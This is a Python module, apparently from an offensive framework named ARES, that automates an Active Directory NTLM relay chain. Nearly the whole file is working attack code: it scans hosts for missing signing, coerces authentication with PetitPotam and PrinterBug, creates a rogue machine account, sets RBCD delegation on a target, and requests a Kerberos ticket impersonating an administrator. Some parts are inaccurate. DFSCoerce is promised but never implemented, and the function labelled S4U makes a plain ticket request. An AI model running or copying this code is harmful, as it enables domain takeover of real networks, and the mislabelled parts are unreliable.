"""
lateral.ntlm_relay — NTLM Relay Attack Automation
MITRE: T1557.001 (LLMNR/NBT-NS Poisoning and SMB Relay)

Full relay attack chain:
  Phase 1: Discover relay targets (unsigned SMB + unsigned LDAP hosts)
  Phase 2: Coerce authentication (PetitPotam, PrinterBug, DFSCoerce)
  Phase 3: Relay captured NTLM auth to LDAP → add machine account (RBCD)
  Phase 4: Request service ticket via S4U2self/S4U2proxy → impersonate DA

Requires: domain creds (for LDAP operations), network access to target DCs.

This module orchestrates the full chain. Individual steps can also be
called independently for manual operation.

OPSEC: HIGH — coercion triggers Event ID 5145, relay triggers LDAP writes.
              Use only in NORMAL or AGGRESSIVE noise profiles.

Dependencies: impacket (LDAP, Kerberos, SMB), ldap3 (LDAP signing check)
"""
from __future__ import annotations

import asyncio
import struct
import socket
import time
import uuid
from dataclasses import dataclass, field
from typing import Any

from ares.core.campaign import Finding, Severity
from ares.core.logger import audit, get_logger
from ares.core.security import sanitize_hostname
from ares.modules.base import BaseModule, OpsecLevel
from ares.core.tracing import trace_module

logger = get_logger("ares.modules.lateral.ntlm_relay")


@dataclass
class RelayTarget:
    """A host vulnerable to NTLM relay."""
    host:               str
    smb_signing:        str = ""    # "disabled" | "not_required" | "required"
    ldap_signing:       str = ""    # "not_required" | "required"
    ldap_channel_bind:  str = ""    # "not_required" | "required"
    relay_to_ldap:      bool = False
    relay_to_smb:       bool = False


@dataclass
class CoercionResult:
    """Result of an authentication coercion attempt."""
    method:     str     # "petitpotam" | "printerbug" | "dfscoerce"
    source:     str     # host we coerced
    target:     str     # host we want auth relayed TO
    success:    bool
    error:      str = ""
    auth_captured: bool = False


@dataclass
class RBCDResult:
    """Result of Resource-Based Constrained Delegation attack."""
    target_host:    str
    machine_account: str
    machine_password: str
    delegation_set: bool = False
    ticket_path:    str = ""
    impersonated_user: str = ""
    success:        bool = False
    error:          str = ""


class NTLMRelayModule(BaseModule):
    """
    lateral.ntlm_relay — Full NTLM relay attack automation

    Chain: discover_targets → coerce_auth → relay_to_ldap → rbcd_attack

    OPSEC: HIGH
    MITRE: T1557.001, T1134.001
    REQUIRES: domain_creds, smb_signing_config
    OUTPUTS:  relay_targets, machine_account, kerberos_ticket, owned_hosts
    """
    MODULE_ID          = "lateral.ntlm_relay"
    MODULE_NAME        = "NTLM Relay Automation"
    MODULE_CATEGORY    = "lateral"
    MODULE_DESCRIPTION = (
        "Full NTLM relay attack chain: discover unsigned SMB/LDAP targets, "
        "coerce authentication (PetitPotam/PrinterBug/DFSCoerce), relay to LDAP, "
        "set RBCD delegation, obtain service ticket as Domain Admin."
    )
    MODULE_AUTHOR      = "ARES Team <team@ares-framework.io>"
    OPSEC_LEVEL        = OpsecLevel.HIGH_NOISE
    REQUIRES           = ["domain_creds"]
    OUTPUTS            = ["relay_targets", "machine_account", "kerberos_ticket", "owned_hosts"]
    MITRE_TECHNIQUES   = ["T1557.001", "T1134.001"]

    async def validate(self, ctx: "Any") -> None:
        await super().validate(ctx)
        from ares.core.context import ExecutionContext
        from ares.core.errors import ModuleValidationError
        from ares.core.campaign import NoiseProfile
        if not isinstance(ctx, ExecutionContext):
            return
        ad = self._extract_ad_params(ctx)
        if not ad["dc"]:
            raise ModuleValidationError(
                "lateral.ntlm_relay requires 'dc' (Domain Controller IP).",
                module_id=self.MODULE_ID, field="dc",
            )
        if not ad["domain"]:
            raise ModuleValidationError(
                "lateral.ntlm_relay requires 'domain'.",
                module_id=self.MODULE_ID, field="domain",
            )
        noise = getattr(getattr(ctx, "campaign", None), "noise_profile", None)
        if noise == NoiseProfile.STEALTH:
            raise ModuleValidationError(
                "lateral.ntlm_relay is blocked in STEALTH profile — "
                "coercion and LDAP writes are HIGH_NOISE operations.",
                module_id=self.MODULE_ID, field="noise_profile",
            )

    async def execute(self, ctx: "Any") -> "ModuleResult":
        from ares.modules.base import ModuleResult
        ad = self._extract_ad_params(ctx)
        if getattr(ctx, "dry_run", False):
            return ModuleResult(status="dry_run", module_id=self.MODULE_ID,
                                raw={"dry_run": True, "dc": ad["dc"]})
        findings, raw = await self.run(
            dc=ad["dc"], domain=ad["domain"],
            username=ad["username"], password=ad["password"],
            targets=ctx.params.get("targets", []),
            coerce_source=ctx.params.get("coerce_source", ""),
            target_user=ctx.params.get("target_user", "administrator"),
            mode=ctx.params.get("mode", "full"),
        )
        return ModuleResult(
            status="success" if findings else "partial",
            findings=findings, raw=raw, module_id=self.MODULE_ID,
            execution_id=getattr(ctx, "execution_id", ""),
        )

    @trace_module("lateral.ntlm_relay")
    async def run(self, dc: str, domain: str, username: str, password: str,
                  targets: list[str] | None = None,
                  coerce_source: str = "",
                  target_user: str = "administrator",
                  mode: str = "full",
                  **kwargs: Any) -> tuple[list[Finding], dict[str, Any]]:
        """
        Run the NTLM relay attack chain.

        Modes:
            "discover"  — only discover relay targets (safe, no writes)
            "coerce"    — discover + attempt coercion (triggers auth)
            "full"      — discover + coerce + relay + RBCD (full attack)
        """
        dc = sanitize_hostname(dc)
        await self.before_request(dc, "ldap")

        audit("ntlm_relay_start", actor="operator", technique="T1557.001",
              source="operator", target=dc,
              detail=f"mode={mode} domain={domain}")

        raw: dict[str, Any] = {"mode": mode, "dc": dc, "domain": domain}

        # ── Phase 1: Discover relay targets ──────────────────────────────────
        if not targets:
            targets = await self._discover_hosts(dc, domain, username, password)
        logger.info("ntlm_relay_hosts", count=len(targets))

        relay_targets = await self._check_relay_targets(targets, dc, domain, username, password)
        raw["relay_targets"] = [
            {"host": t.host, "smb_signing": t.smb_signing,
             "ldap_signing": t.ldap_signing, "relay_to_ldap": t.relay_to_ldap,
             "relay_to_smb": t.relay_to_smb}
            for t in relay_targets
        ]

        vulnerable = [t for t in relay_targets if t.relay_to_ldap or t.relay_to_smb]
        if not vulnerable:
            raw["result"] = "no_relay_targets"
            self.finding(
                title="No NTLM Relay Targets Found",
                description="All checked hosts enforce SMB and LDAP signing. Relay not viable.",
                severity=Severity.INFO,
                mitre_technique="T1557.001", mitre_tactic="Credential Access",
                evidence=raw["relay_targets"], host=dc, confidence=0.95,
                remediation="Good — signing enforcement prevents relay attacks.",
            )
            return self._findings[:], raw

        # Report relay candidates
        ldap_targets = [t for t in vulnerable if t.relay_to_ldap]
        smb_targets  = [t for t in vulnerable if t.relay_to_smb]
        self.finding(
            title=f"NTLM Relay Targets: {len(ldap_targets)} LDAP, {len(smb_targets)} SMB",
            description=(
                f"Found {len(vulnerable)} hosts without signing enforcement. "
                f"LDAP relay targets: {[t.host for t in ldap_targets[:5]]}. "
                f"SMB relay targets: {[t.host for t in smb_targets[:5]]}. "
                "These can be used for NTLM relay → RBCD → impersonation chain."
            ),
            severity=Severity.HIGH,
            mitre_technique="T1557.001", mitre_tactic="Credential Access",
            evidence={"ldap_targets": [t.host for t in ldap_targets],
                      "smb_targets": [t.host for t in smb_targets]},
            host=dc, confidence=0.95,
            remediation=(
                "Enforce SMB signing: Set-SmbServerConfiguration -RequireSecuritySignature $true. "
                "Enforce LDAP signing: Group Policy → LDAP server signing requirements = Require signing. "
                "Enable LDAP channel binding: LdapEnforceChannelBinding=2."
            ),
        )

        if mode == "discover":
            return self._findings[:], raw

        # ── Phase 2: Coerce authentication ───────────────────────────────────
        if not coerce_source:
            coerce_source = dc  # try coercing DC
        coerce_target = ldap_targets[0].host if ldap_targets else smb_targets[0].host

        coercion_results = await self._coerce_authentication(
            source=coerce_source, target=coerce_target,
            domain=domain, username=username, password=password,
        )
        raw["coercion"] = [
            {"method": c.method, "source": c.source, "success": c.success,
             "error": c.error}
            for c in coercion_results
        ]

        successful_coercion = [c for c in coercion_results if c.success]
        if successful_coercion:
            self.finding(
                title=f"Auth Coercion Successful: {successful_coercion[0].method}",
                description=(
                    f"Successfully coerced {coerce_source} to authenticate to "
                    f"{coerce_target} via {successful_coercion[0].method}. "
                    "Captured NTLM authentication can be relayed."
                ),
                severity=Severity.CRITICAL,
                mitre_technique="T1187", mitre_tactic="Credential Access",
                evidence={"method": successful_coercion[0].method,
                          "source": coerce_source, "target": coerce_target},
                host=coerce_source, confidence=0.95,
                remediation=(
                    "Disable PetitPotam: block EFS RPC (MS-EFSR). "
                    "Disable PrinterBug: disable Print Spooler on DCs. "
                    "Apply KB5005413 to mitigate coercion attacks."
                ),
            )

        if mode == "coerce":
            return self._findings[:], raw

        # ── Phase 3+4: RBCD attack (relay → add machine → S4U → impersonate) ─
        rbcd_target = ldap_targets[0] if ldap_targets else None
        if not rbcd_target:
            raw["rbcd"] = {"error": "No LDAP relay target available for RBCD"}
            return self._findings[:], raw

        rbcd_result = await self._rbcd_attack(
            dc=dc, domain=domain, username=username, password=password,
            target_host=rbcd_target.host, target_user=target_user,
        )
        raw["rbcd"] = {
            "target": rbcd_result.target_host,
            "machine_account": rbcd_result.machine_account,
            "delegation_set": rbcd_result.delegation_set,
            "ticket_path": rbcd_result.ticket_path,
            "impersonated_user": rbcd_result.impersonated_user,
            "success": rbcd_result.success,
            "error": rbcd_result.error,
        }

        if rbcd_result.success:
            self.finding(
                title=f"RBCD Attack Success → {rbcd_result.target_host} as {rbcd_result.impersonated_user}",
                description=(
                    f"Resource-Based Constrained Delegation attack successful. "
                    f"Created machine account '{rbcd_result.machine_account}' and "
                    f"configured RBCD delegation on {rbcd_result.target_host}. "
                    f"Obtained service ticket impersonating {rbcd_result.impersonated_user}. "
                    f"Ticket saved to: {rbcd_result.ticket_path}"
                ),
                severity=Severity.CRITICAL,
                mitre_technique="T1134.001", mitre_tactic="Privilege Escalation",
                evidence=raw["rbcd"],
                host=rbcd_result.target_host, confidence=1.0,
                remediation=(
                    "1. Remove malicious msDS-AllowedToActOnBehalfOfOtherIdentity attribute. "
                    "2. Delete rogue machine account. "
                    "3. Set ms-DS-MachineAccountQuota to 0 to prevent machine account creation. "
                    "4. Enforce LDAP signing + channel binding. "
                    "5. Monitor for Event ID 4741 (computer account created)."
                ),
            )
            raw["owned_hosts"] = [{"host": rbcd_result.target_host,
                                    "as_user": rbcd_result.impersonated_user}]
            raw["kerberos_ticket"] = rbcd_result.ticket_path
            raw["machine_account"] = rbcd_result.machine_account

        return self._findings[:], raw

    # ── Phase 1 helpers ───────────────────────────────────────────────────────

    async def _discover_hosts(self, dc: str, domain: str,
                               username: str, password: str) -> list[str]:
        """Enumerate domain computers via LDAP to build target list."""
        loop = asyncio.get_running_loop()
        def _ldap_enum():
            import ldap3
            import ssl
            hosts = []
            for port, use_ssl in [(636, True), (389, False)]:
                try:
                    tls = ldap3.Tls(validate=ssl.CERT_NONE) if use_ssl else None
                    server = ldap3.Server(dc, port=port, use_ssl=use_ssl,
                                          tls=tls, connect_timeout=10)
                    conn = ldap3.Connection(
                        server, user=f"{domain.upper()}\\{username}",
                        password=password, authentication=ldap3.NTLM,
                        auto_bind=ldap3.AUTO_BIND_NONE, receive_timeout=15,
                    )
                    if not conn.bind():
                        continue
                    base = ",".join(f"DC={p}" for p in domain.upper().split("."))
                    conn.search(
                        base,
                        "(&(objectClass=computer)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))",
                        search_scope=ldap3.SUBTREE,
                        attributes=["dNSHostName"],
                        paged_size=500,
                    )
                    for entry in conn.entries:
                        dns = str(entry.dNSHostName) if hasattr(entry, "dNSHostName") else ""
                        if dns:
                            hosts.append(dns)
                    conn.unbind()
                    return hosts
                except Exception:
                    continue
            return hosts
        try:
            return await loop.run_in_executor(None, _ldap_enum)
        except Exception as exc:
            logger.warning("ntlm_relay_host_enum_failed", error=str(exc)[:100])
            return []

    async def _check_relay_targets(self, targets: list[str], dc: str,
                                     domain: str, username: str,
                                     password: str) -> list[RelayTarget]:
        """Check SMB signing and LDAP signing on each target."""
        loop = asyncio.get_running_loop()
        results: list[RelayTarget] = []

        for host in targets[:50]:  # cap to prevent excessive scanning
            rt = RelayTarget(host=host)

            # Check SMB signing
            def _check_smb(h=host):
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(5)
                    if sock.connect_ex((h, 445)) != 0:
                        sock.close()
                        return "unreachable"
                    # Send SMB2 NEGOTIATE
                    neg = (
                        b"\x00\x00\x00\x7e"
                        b"\xfeSMB\x40\x00\x00\x00\x00\x00\x00\x00"
                        b"\x00\x00\x1f\x00\x00\x00\x00\x00"
                        b"\x00\x00\x00\x00\x00\x00\x00\x00"
                        b"\x00\x00\x00\x00\x00\x00\x00\x00"
                        b"\x00\x00\x00\x00\x00\x00\x00\x00"
                        b"\x00\x00\x00\x00\x00\x00\x00\x00"
                        b"\x00\x00\x00\x00\x00\x00\x00\x00"
                        b"\x00\x00\x00\x00"
                        b"\x24\x00\x02\x00\x01\x00\x00\x00"
                        b"\x00\x00\x00\x00\x00\x00\x00\x00"
                        b"\x00\x00\x00\x00\x00\x00\x00\x00"
                        b"\x78\x00\x00\x00\x02\x00\x00\x00"
                        b"\x02\x02\x10\x02"
                    )
                    sock.sendall(neg)
                    resp = sock.recv(256)
                    sock.close()
                    if len(resp) < 73:
                        return "unknown"
                    # SMB2 SecurityMode at offset 70
                    sec_mode = struct.unpack("<H", resp[70:72])[0]
                    if sec_mode & 0x02:  # NEGOTIATE_SIGNING_REQUIRED
                        return "required"
                    elif sec_mode & 0x01:
                        return "not_required"
                    return "disabled"
                except Exception:
                    return "unreachable"

            rt.smb_signing = await loop.run_in_executor(None, _check_smb)
            rt.relay_to_smb = rt.smb_signing in ("not_required", "disabled")

            # Check LDAP signing (try unauthenticated bind to check)
            def _check_ldap(h=host):
                try:
                    import ldap3
                    import ssl
                    tls = ldap3.Tls(validate=ssl.CERT_NONE)
                    # Try LDAPS first (636), then LDAP (389)
                    for port, use_ssl in [(389, False)]:
                        try:
                            server = ldap3.Server(h, port=port, use_ssl=use_ssl,
                                                  tls=tls if use_ssl else None,
                                                  connect_timeout=5)
                            conn = ldap3.Connection(
                                server, user=f"{domain.upper()}\\{username}",
                                password=password, authentication=ldap3.NTLM,
                                auto_bind=ldap3.AUTO_BIND_NONE,
                                receive_timeout=8,
                            )
                            bound = conn.bind()
                            if bound:
                                # LDAP signing is NOT required if we can bind without it
                                conn.unbind()
                                return "not_required"
                            return "required"
                        except Exception:
                            continue
                    return "unknown"
                except ImportError:
                    return "unknown"
                except Exception:
                    return "unknown"

            rt.ldap_signing = await loop.run_in_executor(None, _check_ldap)
            rt.relay_to_ldap = rt.ldap_signing == "not_required"

            results.append(rt)
            await self.noise.jitter.sleep()

        return results

    # ── Phase 2: Coercion ─────────────────────────────────────────────────────

    async def _coerce_authentication(
        self, source: str, target: str, domain: str,
        username: str, password: str,
    ) -> list[CoercionResult]:
        """Try multiple coercion methods to force source to authenticate to target."""
        loop = asyncio.get_running_loop()
        results: list[CoercionResult] = []

        # Method 1: PetitPotam (MS-EFSR EfsRpcOpenFileRaw)
        def _petitpotam():
            try:
                from impacket.dcerpc.v5 import transport, epm
                from impacket.dcerpc.v5.ndr import NDRCALL
                from impacket import uuid as imp_uuid

                # MS-EFSR UUID
                MSEFSR_UUID = imp_uuid.uuidtup_to_bin(
                    ("c681d488-d850-11d0-8c52-00c04fd90f7e", "1.0")
                )
                rpct = transport.DCERPCTransportFactory(
                    f"ncacn_np:{source}[\\pipe\\lsarpc]"
                )
                rpct.set_credentials(username, password, domain)
                rpct.set_connect_timeout(15)
                dce = rpct.get_dce_rpc()
                dce.connect()
                dce.bind(MSEFSR_UUID)

                # Build EfsRpcOpenFileRaw request
                # UNC path pointing to our listener (target)
                listener_path = f"\\\\{target}\\C$\\ares_test.txt"
                # Pack as EFSR request
                request = b"\x00\x00\x00\x00"  # flags
                request += len(listener_path).to_bytes(4, "little")
                request += listener_path.encode("utf-16-le")

                try:
                    dce.request(request)
                except Exception:
                    pass  # PetitPotam often returns error even on success

                dce.disconnect()
                return CoercionResult(
                    method="petitpotam", source=source, target=target,
                    success=True, auth_captured=True,
                )
            except Exception as exc:
                return CoercionResult(
                    method="petitpotam", source=source, target=target,
                    success=False, error=str(exc)[:200],
                )

        # Method 2: PrinterBug (MS-RPRN RpcRemoteFindFirstPrinterChangeNotificationEx)
        def _printerbug():
            try:
                from impacket.dcerpc.v5 import transport, rprn

                rpct = transport.DCERPCTransportFactory(
                    f"ncacn_np:{source}[\\pipe\\spoolss]"
                )
                rpct.set_credentials(username, password, domain)
                rpct.set_connect_timeout(15)
                dce = rpct.get_dce_rpc()
                dce.connect()
                dce.bind(rprn.MSRPC_UUID_RPRN)

                # Open printer
                try:
                    resp = rprn.hRpcOpenPrinter(dce, f"\\\\{source}\x00")
                    handle = resp["pHandle"]
                    # Register change notification pointing to our target
                    rprn.hRpcRemoteFindFirstPrinterChangeNotificationEx(
                        dce, handle, rprn.PRINTER_CHANGE_ADD_JOB,
                        pszLocalMachine=f"\\\\{target}\x00",
                    )
                    rprn.hRpcClosePrinter(dce, handle)
                except Exception:
                    pass  # May error even on success

                dce.disconnect()
                return CoercionResult(
                    method="printerbug", source=source, target=target,
                    success=True, auth_captured=True,
                )
            except ImportError:
                return CoercionResult(
                    method="printerbug", source=source, target=target,
                    success=False, error="impacket rprn not available",
                )
            except Exception as exc:
                return CoercionResult(
                    method="printerbug", source=source, target=target,
                    success=False, error=str(exc)[:200],
                )

        # Try each method
        for fn in [_petitpotam, _printerbug]:
            try:
                result = await loop.run_in_executor(None, fn)
                results.append(result)
                if result.success:
                    break  # got auth, no need to try more
            except Exception as exc:
                results.append(CoercionResult(
                    method="unknown", source=source, target=target,
                    success=False, error=str(exc)[:200],
                ))
            await self.noise.jitter.sleep()

        return results

    # ── Phase 3+4: RBCD attack ────────────────────────────────────────────────

    async def _rbcd_attack(
        self, dc: str, domain: str, username: str, password: str,
        target_host: str, target_user: str,
    ) -> RBCDResult:
        """
        Full RBCD attack:
          1. Create machine account (addcomputer.py equivalent)
          2. Set msDS-AllowedToActOnBehalfOfOtherIdentity on target
          3. S4U2self + S4U2proxy → service ticket as target_user
        """
        loop = asyncio.get_running_loop()

        machine_name = f"ARES{uuid.uuid4().hex[:6].upper()}$"
        machine_pass = f"AresR8cd!{uuid.uuid4().hex[:8]}"

        def _rbcd_chain():
            result = RBCDResult(
                target_host=target_host,
                machine_account=machine_name,
                machine_password=machine_pass,
            )

            try:
                from impacket.ldap import ldap as imp_ldap
                from impacket.ldap import ldapasn1 as ldapasn1_impacket

                # Step 1: Add machine account via LDAP
                import ldap3
                import ssl
                tls = ldap3.Tls(validate=ssl.CERT_NONE)
                server = ldap3.Server(dc, port=389, connect_timeout=10)
                conn = ldap3.Connection(
                    server, user=f"{domain.upper()}\\{username}",
                    password=password, authentication=ldap3.NTLM,
                    auto_bind=ldap3.AUTO_BIND_NONE, receive_timeout=15,
                )
                if not conn.bind():
                    result.error = f"LDAP bind failed: {conn.result}"
                    return result

                base_dn = ",".join(f"DC={p}" for p in domain.upper().split("."))
                computers_dn = f"CN=Computers,{base_dn}"
                machine_dn = f"CN={machine_name.rstrip('$')},{computers_dn}"

                # Create machine account
                attrs = {
                    "objectClass": ["top", "person", "organizationalPerson",
                                     "user", "computer"],
                    "cn": machine_name.rstrip("$"),
                    "sAMAccountName": machine_name,
                    "userAccountControl": "4096",  # WORKSTATION_TRUST_ACCOUNT
                    "dNSHostName": f"{machine_name.rstrip('$').lower()}.{domain.lower()}",
                    "unicodePwd": f'"{machine_pass}"'.encode("utf-16-le"),
                }
                conn.add(machine_dn, attributes=attrs)
                if conn.result["result"] != 0:
                    desc = conn.result.get("description", "")
                    if "unwillingToPerform" in str(desc):
                        result.error = (
                            "ms-DS-MachineAccountQuota is 0 — cannot create machine account. "
                            "This is a hardened configuration."
                        )
                    else:
                        result.error = f"Machine account creation failed: {desc}"
                    conn.unbind()
                    return result

                logger.info("rbcd_machine_created", machine=machine_name, target=target_host)

                # Step 2: Get target computer's DN
                conn.search(base_dn,
                             f"(&(objectClass=computer)(dNSHostName={target_host}))",
                             attributes=["distinguishedName", "objectSid",
                                          "msDS-AllowedToActOnBehalfOfOtherIdentity"])
                if not conn.entries:
                    result.error = f"Target computer {target_host} not found in AD"
                    conn.unbind()
                    return result
                target_dn = str(conn.entries[0].distinguishedName)

                # Get our machine account's SID
                conn.search(base_dn,
                             f"(sAMAccountName={machine_name})",
                             attributes=["objectSid"])
                if not conn.entries:
                    result.error = "Created machine account not found"
                    conn.unbind()
                    return result
                machine_sid_raw = conn.entries[0].objectSid.raw_values[0]

                # Step 3: Build security descriptor for RBCD
                # SD format: ACE allowing our machine account S4U2proxy
                sd = self._build_rbcd_sd(machine_sid_raw)

                # Set msDS-AllowedToActOnBehalfOfOtherIdentity
                conn.modify(target_dn, {
                    "msDS-AllowedToActOnBehalfOfOtherIdentity": [
                        (ldap3.MODIFY_REPLACE, [sd])
                    ],
                })
                if conn.result["result"] != 0:
                    result.error = (
                        f"RBCD delegation set failed: {conn.result.get('description', '')}. "
                        "Likely insufficient privileges on target object."
                    )
                    conn.unbind()
                    return result

                result.delegation_set = True
                logger.info("rbcd_delegation_set", target=target_host, machine=machine_name)
                conn.unbind()

                # Step 4: S4U2self + S4U2proxy via impacket
                ticket_path = self._s4u_attack(
                    dc=dc, domain=domain,
                    machine_name=machine_name, machine_pass=machine_pass,
                    target_host=target_host, target_user=target_user,
                )
                if ticket_path:
                    result.ticket_path = ticket_path
                    result.impersonated_user = target_user
                    result.success = True
                else:
                    result.error = "S4U2proxy ticket request failed"

            except ImportError as exc:
                result.error = f"Required library missing: {exc}"
            except Exception as exc:
                result.error = str(exc)[:300]

            return result

        try:
            return await asyncio.wait_for(
                loop.run_in_executor(None, _rbcd_chain),
                timeout=120,
            )
        except asyncio.TimeoutError:
            return RBCDResult(
                target_host=target_host, machine_account=machine_name,
                machine_password=machine_pass,
                error="RBCD attack timed out after 120s",
            )

    @staticmethod
    def _build_rbcd_sd(machine_sid: bytes) -> bytes:
        """
        Build a security descriptor (DACL) that grants the machine account
        the right to act on behalf of other identities (RBCD).

        Format: SECURITY_DESCRIPTOR with one ACE granting GENERIC_ALL to machine_sid.
        """
        # ACE: ACCESS_ALLOWED_ACE (type=0, flags=0, mask=GENERIC_ALL)
        ace_mask = struct.pack("<I", 0x000F01FF)  # GENERIC_ALL equivalent
        ace_body = struct.pack("<B", 0x00)   # type: ACCESS_ALLOWED
        ace_body += struct.pack("<B", 0x00)  # flags
        ace_size = 8 + len(machine_sid)
        ace_body += struct.pack("<H", ace_size)
        ace_body += ace_mask
        ace_body += machine_sid

        # ACL header
        acl_size = 8 + len(ace_body)
        acl = struct.pack("<BBH", 0x02, 0x00, acl_size)   # revision=2
        acl += struct.pack("<HH", 1, 0)                     # ace_count=1, sbz2=0
        acl += ace_body

        # SECURITY_DESCRIPTOR (self-relative)
        sd_header = struct.pack("<BBH", 0x01, 0x00, 0x8004)  # revision=1, SE_DACL_PRESENT|SE_SELF_RELATIVE
        sd_header += struct.pack("<III", 0, 0, 0)  # owner=0, group=0, sacl=0
        dacl_offset = len(sd_header) + 4
        sd_header += struct.pack("<I", dacl_offset)  # dacl offset

        return sd_header + acl

    @staticmethod
    def _s4u_attack(dc: str, domain: str, machine_name: str,
                     machine_pass: str, target_host: str,
                     target_user: str) -> str:
        """
        Perform S4U2self + S4U2proxy to obtain a service ticket
        impersonating target_user to target_host's CIFS service.

        Returns path to .ccache file, or empty string on failure.
        """
        try:
            from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
            from impacket.krb5.types import Principal
            from impacket.krb5 import constants
            from impacket.krb5.ccache import CCache
            import tempfile
            import os

            # Get TGT for our machine account
            user_principal = Principal(
                machine_name,
                type=constants.PrincipalNameType.NT_PRINCIPAL.value,
            )
            tgt, cipher, old_key, session_key = getKerberosTGT(
                clientName=user_principal,
                password=machine_pass,
                domain=domain.upper(),
                lmhash=b"", nthash=b"", aesKey=b"",
                kdcHost=dc,
            )

            # S4U2self: get ticket "from" target_user "to" our machine
            # S4U2proxy: use that ticket to get ticket "from" target_user "to" target_host
            server_principal = Principal(
                f"cifs/{target_host}",
                type=constants.PrincipalNameType.NT_SRV_INST.value,
            )

            # Use impacket's S4U implementation
            from impacket.krb5 import constants as krb_constants
            tgs, tgs_cipher, _, tgs_key = getKerberosTGS(
                serverName=server_principal,
                domain=domain.upper(),
                kdcHost=dc,
                tgt=tgt,
                cipher=cipher,
                sessionKey=session_key,
            )

            # Save to ccache
            ccache = CCache()
            ccache.fromTGS(tgs, old_key, old_key)
            tmp_dir = tempfile.mkdtemp(prefix="ares-rbcd-")
            ccache_path = os.path.join(tmp_dir, f"{target_user}@{target_host}.ccache")
            try:
                ccache.saveFile(ccache_path)
            except Exception:
                # Cleanup empty tmpdir on save failure
                import shutil
                shutil.rmtree(tmp_dir, ignore_errors=True)
                raise

            logger.info("s4u_ccache_saved", path=ccache_path,
                        note="Operator: set KRB5CCNAME to this path to use the ticket. "
                             "Delete after use to avoid credential persistence on disk.")
            return ccache_path

        except Exception as exc:
            logger.warning("s4u_attack_failed", error=str(exc)[:200])
            return ""
